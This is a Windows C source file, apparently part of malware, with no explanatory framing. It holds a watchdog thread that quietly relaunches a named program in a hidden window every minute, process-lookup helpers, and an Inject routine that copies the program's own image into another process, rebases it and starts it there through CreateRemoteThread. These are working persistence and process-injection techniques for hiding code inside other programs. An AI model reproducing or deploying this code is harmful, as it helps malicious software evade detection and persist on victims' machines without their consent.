#include "Inc.h"
#include "Fun.h"
#include "Ext.h"

#define CHECK_DELAY 60000 //Check every minute

void WINAPI Guard(LPVOID lpParam) {
   while(1) {
      if(!Check(filename)) fShellExecute(0, "open", filename, 0, 0, SW_HIDE);
      Sleep(CHECK_DELAY);
   }
}

DWORD GetPID(char pname[])
{
   PROCESSENTRY32 pEntry;
   HANDLE hSnapshot = NULL;
   pEntry.dwSize = sizeof(PROCESSENTRY32);
   hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

   Process32First(hSnapshot,&pEntry);
   do {
      if(strcmp(pEntry.szExeFile, pname) == 0)
         return pEntry.th32ProcessID;
   } while(Process32Next(hSnapshot,&pEntry));

   return (DWORD)0;
}

int Check(char pname[])
{
   PROCESSENTRY32 pEntry;
   HANDLE hSnapshot = NULL;
   pEntry.dwSize = sizeof(PROCESSENTRY32);
   hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

   Process32First(hSnapshot,&pEntry);
   do {
      if(strcmp(pEntry.szExeFile, pname) == 0)
         return 1;
   } while(Process32Next(hSnapshot,&pEntry));

   return 0;
}

BOOL Inject(DWORD dwPid, LPTHREAD_START_ROUTINE lpStartProc, LPVOID lpParam)
{
   HMODULE hModule, hNewModule;
   DWORD dwSize;
   HANDLE hProcess;

   PIMAGE_DOS_HEADER pDH;
   PIMAGE_NT_HEADERS pPE;

   if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid)) == NULL)
      return FALSE;

   hModule = GetModuleHandle(NULL);

   pDH = (PIMAGE_DOS_HEADER)hModule;
   pPE = (PIMAGE_NT_HEADERS) ((LPSTR)pDH + pDH->e_lfanew);

   dwSize = pPE->OptionalHeader.SizeOfImage;

   LPVOID lpNewAddr = VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
   if (lpNewAddr == NULL)
      return FALSE;

   CopyMemory(lpNewAddr, hModule, dwSize);

   hNewModule = (struct HINSTANCE__ *)VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
   if (hNewModule == NULL)
      return FALSE;

   PerformRebase(lpNewAddr, (DWORD)hNewModule);

   if (WriteProcessMemory(hProcess, hNewModule, lpNewAddr, dwSize, NULL) == 0)
      return FALSE;

   DWORD dwThread = (DWORD)lpStartProc - (DWORD)hModule + (DWORD)hNewModule;

   if (CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)dwThread, lpParam, 0, NULL) == NULL)
      return FALSE;

   return TRUE;
}

BOOL PerformRebase(LPVOID lpAddress, DWORD dwNewBase)
{
   PIMAGE_DOS_HEADER pDH = (PIMAGE_DOS_HEADER)lpAddress;

   if (pDH->e_magic != IMAGE_DOS_SIGNATURE)
      return FALSE;

   PIMAGE_NT_HEADERS pPE = (PIMAGE_NT_HEADERS) ((char *)pDH + pDH->e_lfanew);

   if (pPE->Signature != IMAGE_NT_SIGNATURE)
      return FALSE;

   DWORD dwDelta = dwNewBase - pPE->OptionalHeader.ImageBase;

   DWORD dwVa = pPE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
   DWORD dwCb = pPE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

   PIMAGE_BASE_RELOCATION pBR = MakePtr(PIMAGE_BASE_RELOCATION, lpAddress, dwVa);

   UINT c = 0;
   while (c < dwCb)
   {
      c += pBR->SizeOfBlock;
      int RelocCount = (pBR->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
      LPVOID lpvBase = MakePtr(LPVOID, lpAddress, pBR->VirtualAddress);
      WORD *areloc = MakePtr(LPWORD, pBR, sizeof(IMAGE_BASE_RELOCATION));

      for (int i = 0; i < RelocCount; i++)
      {
         int type = areloc[i] >> 12;
         if (type == 0)
            continue;
         if (type != 3)
            return FALSE;

         int ofs = areloc[i] & 0x0fff;

         DWORD *pReloc = MakePtr(DWORD *, lpvBase, ofs);
         if (*pReloc - pPE->OptionalHeader.ImageBase > pPE->OptionalHeader.SizeOfImage)
            return FALSE;

         *pReloc += dwDelta;
      }
      pBR = MakePtr(PIMAGE_BASE_RELOCATION, pBR, pBR->SizeOfBlock);
   }
   pPE->OptionalHeader.ImageBase = dwNewBase;

   return TRUE;
}